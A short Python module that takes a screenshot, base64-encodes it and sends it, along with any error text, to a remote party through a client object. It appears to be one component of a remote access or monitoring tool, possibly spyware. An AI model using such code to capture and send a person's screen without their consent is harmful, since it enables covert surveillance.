import pyautogui
import io
from PIL import ImageGrab
import base64

def send_screenshot(client, converter):
    try:
        try:
            screenshot = pyautogui.screenshot()
        except OSError:
            screenshot = ImageGrab.grab()

        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        screenshot_data = buffer.getvalue()

        screenshot_base64 = base64.b64encode(screenshot_data).decode("utf-8")

        client.send_message(converter.encode({"screenshot": screenshot_base64}))

    except Exception as e:
        client.send_message(converter.encode({"screenshot_logger": str(e)}))
